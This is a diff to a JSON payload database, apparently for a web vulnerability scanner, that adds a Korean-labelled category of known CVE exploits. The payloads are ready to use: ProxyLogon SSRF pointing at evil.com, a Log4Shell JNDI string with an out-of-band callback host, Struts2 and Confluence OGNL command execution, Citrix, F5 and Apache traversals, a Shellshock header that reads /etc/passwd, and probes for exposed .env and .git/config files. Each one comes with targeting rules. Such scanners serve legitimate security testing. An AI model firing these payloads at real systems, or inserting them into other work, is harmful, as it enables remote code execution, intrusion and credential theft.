@@ -4733,6 +4733,284 @@
           "reference": "https://portswigger.net/web-security/dom-based/dom-clobbering"
         }
       ]
+    },
+    {
+      "id": "cve",
+      "name": "알려진 취약점 (CVE)",
+      "icon": "🎯",
+      "color": "#e84393",
+      "group": "server",
+      "payloads": [
+        {
+          "id": "cve_proxylogon",
+          "name": "CVE-2021-26855 ProxyLogon (Exchange SSRF)",
+          "payload": "/autodiscover/autodiscover.json?@evil.com/mapi/emsmdb/?a=~1942062522",
+          "description": "MS Exchange Autodiscover SSRF → 인증 우회 체인(ProxyLogon).",
+          "risk": "critical",
+          "cve": "CVE-2021-26855",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-26855",
+          "applies_to": {
+            "path_contains": [
+              "autodiscover",
+              "/ecp",
+              "/owa",
+              "/mapi",
+              "/rpc"
+            ],
+            "server": [
+              "microsoft-iis",
+              "iis"
+            ]
+          }
+        },
+        {
+          "id": "cve_log4shell",
+          "name": "CVE-2021-44228 Log4Shell (JNDI)",
+          "payload": "${jndi:ldap://log4shell-${sys:java.version}.example.oast/a}",
+          "description": "Log4j JNDI 조회 → OOB. 헤더/파라미터에 삽입해 아웃바운드 콜백 확인.",
+          "risk": "critical",
+          "cve": "CVE-2021-44228",
+          "location": "header",
+          "param": "X-Api-Version",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+          "applies_to": {
+            "always": true,
+            "powered_by": [
+              "java",
+              "jsp",
+              "servlet"
+            ]
+          }
+        },
+        {
+          "id": "cve_struts_5638",
+          "name": "CVE-2017-5638 Struts2 OGNL (Content-Type)",
+          "payload": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['Content-Type']).(#cmd='id').(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c',#cmd})).(#p.redirectErrorStream(true)).(#proc=#p.start())}",
+          "description": "Struts2 Jakarta Content-Type OGNL 주입 → RCE.",
+          "risk": "critical",
+          "cve": "CVE-2017-5638",
+          "location": "header",
+          "param": "Content-Type",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-5638",
+          "applies_to": {
+            "path_contains": [
+              ".action",
+              ".do",
+              "struts"
+            ]
+          }
+        },
+        {
+          "id": "cve_confluence_26134",
+          "name": "CVE-2022-26134 Confluence OGNL",
+          "payload": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29%7D/",
+          "description": "Atlassian Confluence OGNL 주입 → 인증 없는 RCE.",
+          "risk": "critical",
+          "cve": "CVE-2022-26134",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-26134",
+          "applies_to": {
+            "path_contains": [
+              "confluence",
+              "/pages/",
+              "/wiki",
+              "/spaces",
+              "/display"
+            ]
+          }
+        },
+        {
+          "id": "cve_citrix_19781",
+          "name": "CVE-2019-19781 Citrix ADC 경로 traversal",
+          "payload": "/vpn/../vpns/cfg/smb.conf",
+          "description": "Citrix ADC/Gateway 디렉터리 traversal → 템플릿 RCE 체인.",
+          "risk": "critical",
+          "cve": "CVE-2019-19781",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-19781",
+          "applies_to": {
+            "path_contains": [
+              "/vpn",
+              "/vpns",
+              "/citrix",
+              "/cgi/"
+            ]
+          }
+        },
+        {
+          "id": "cve_f5_5902",
+          "name": "CVE-2020-5902 F5 BIG-IP TMUI RCE",
+          "payload": "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user",
+          "description": "F5 BIG-IP TMUI 인증 우회 → tmsh 명령 실행.",
+          "risk": "critical",
+          "cve": "CVE-2020-5902",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-5902",
+          "applies_to": {
+            "path_contains": [
+              "/tmui",
+              "bigip",
+              "/mgmt"
+            ]
+          }
+        },
+        {
+          "id": "cve_apache_41773",
+          "name": "CVE-2021-41773 Apache 경로 traversal/RCE",
+          "payload": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+          "description": "Apache 2.4.49 경로 정규화 우회 → 파일 읽기/CGI 시 RCE.",
+          "risk": "high",
+          "cve": "CVE-2021-41773",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
+          "applies_to": {
+            "path_contains": [
+              "/cgi-bin",
+              "/icons/"
+            ],
+            "server": [
+              "apache/2.4.49",
+              "apache/2.4.50"
+            ]
+          }
+        },
+        {
+          "id": "cve_shellshock_6271",
+          "name": "CVE-2014-6271 Shellshock (bash)",
+          "payload": "() { :; }; echo; echo; /bin/cat /etc/passwd",
+          "description": "CGI 환경변수 경유 bash 함수 정의 주입 → 명령 실행.",
+          "risk": "critical",
+          "cve": "CVE-2014-6271",
+          "location": "header",
+          "param": "User-Agent",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
+          "applies_to": {
+            "path_contains": [
+              "/cgi-bin",
+              ".cgi",
+              ".sh",
+              ".pl"
+            ]
+          }
+        },
+        {
+          "id": "cve_phpunit_9841",
+          "name": "CVE-2017-9841 PHPUnit eval-stdin RCE",
+          "payload": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+          "description": "노출된 PHPUnit eval-stdin.php 로 POST 본문 PHP 실행.",
+          "risk": "critical",
+          "cve": "CVE-2017-9841",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-9841",
+          "applies_to": {
+            "path_contains": [
+              "/vendor",
+              "/phpunit",
+              "laravel"
+            ],
+            "powered_by": [
+              "php"
+            ]
+          }
+        },
+        {
+          "id": "cve_spring_gw_22947",
+          "name": "CVE-2022-22947 Spring Cloud Gateway SpEL",
+          "payload": "/actuator/gateway/routes",
+          "description": "Spring Cloud Gateway actuator 노출 시 SpEL 주입 → RCE(라우트 추가 후 refresh).",
+          "risk": "critical",
+          "cve": "CVE-2022-22947",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-22947",
+          "applies_to": {
+            "path_contains": [
+              "/actuator",
+              "/gateway"
+            ],
+            "powered_by": [
+              "java",
+              "spring"
+            ]
+          }
+        },
+        {
+          "id": "expose_actuator_env",
+          "name": "Spring Boot Actuator 노출 (env/heapdump)",
+          "payload": "/actuator/env",
+          "description": "인증 없는 actuator 노출 → 환경변수/시크릿, /heapdump 로 메모리 덤프.",
+          "risk": "high",
+          "cve": "",
+          "location": "path",
+          "param": "",
+          "reference": "https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html",
+          "applies_to": {
+            "path_contains": [
+              "/actuator",
+              "/manage",
+              "/env",
+              "/heapdump"
+            ],
+            "powered_by": [
+              "java",
+              "spring"
+            ]
+          }
+        },
+        {
+          "id": "cve_f5_22986",
+          "name": "CVE-2021-22986 F5 iControl REST RCE",
+          "payload": "/mgmt/tm/util/bash",
+          "description": "F5 iControl REST 인증 우회 → bash 유틸로 명령 실행(POST utilCmdArgs).",
+          "risk": "critical",
+          "cve": "CVE-2021-22986",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-22986",
+          "applies_to": {
+            "path_contains": [
+              "/mgmt",
+              "/tm/",
+              "bigip"
+            ]
+          }
+        },
+        {
+          "id": "expose_git_config",
+          "name": "소스 노출 — .git/config",
+          "payload": "/.git/config",
+          "description": "버전관리 디렉터리 노출 → 소스/시크릿 유출.",
+          "risk": "high",
+          "cve": "",
+          "location": "path",
+          "param": "",
+          "reference": "https://owasp.org/www-community/attacks/Information_exposure_through_query_strings",
+          "applies_to": {
+            "always": true
+          }
+        },
+        {
+          "id": "expose_env_file",
+          "name": "환경파일 노출 — /.env",
+          "payload": "/.env",
+          "description": ".env 노출 → DB 자격증명/API 키 유출.",
+          "risk": "critical",
+          "cve": "",
+          "location": "path",
+          "param": "",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/",
+          "applies_to": {
+            "always": true
+          }
+        }
+      ]
     }
   ]
 }
